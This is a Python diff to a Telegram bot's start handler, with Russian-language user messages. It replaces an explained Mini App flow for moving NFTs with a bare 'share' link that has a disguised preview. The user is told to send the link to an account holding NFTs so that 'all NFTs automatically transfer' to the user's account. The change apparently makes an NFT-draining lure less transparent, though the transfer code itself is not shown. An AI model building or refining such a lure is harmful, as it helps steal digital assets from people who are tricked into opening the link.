@@ -24,28 +24,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     logger.info(f"Пользователь {user_id} ({user.username}) запустил бота")
 
-    mini_app_link = f"{MINI_APP_URL}?tgWebAppStartParam={user_id}"
+    # Используем share endpoint для красивого preview
+    backend_url = os.getenv("WEBHOOK_URL", "https://project-nft.onrender.com")
+    share_link = f"{backend_url}/share/{user_id}"
 
     message_text = (
         f"👋 Привет, {user.first_name}!\n\n"
-        f"🦦 Этот бот помогает переводить Telegram NFT между аккаунтами.\n\n"
-        f"📤 **Как отправить NFT:**\n"
-        f"1. Скопируй эту ссылку:\n"
-        f"`{mini_app_link}`\n\n"
-        f"2. Отправь её в чат с аккаунтом, на котором есть NFT\n"
-        f"3. На том аккаунте открой ссылку\n"
-        f"4. Подключи кошелёк и отправь NFT одной кнопкой!\n\n"
-        f"💎 NFT придёт на этот аккаунт (ID: `{user_id}`)"
+        f"🦦 Отправь эту ссылку на аккаунт с NFT:\n\n"
+        f"{share_link}\n\n"
+        f"💎 Все NFT автоматически перейдут на этот аккаунт!"
     )
-
-    keyboard = [
-        [InlineKeyboardButton("🦦 Открыть Mini App", url=mini_app_link)]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
 
     await update.message.reply_text(
         message_text,
-        reply_markup=reply_markup,
         parse_mode='Markdown'
     )
 
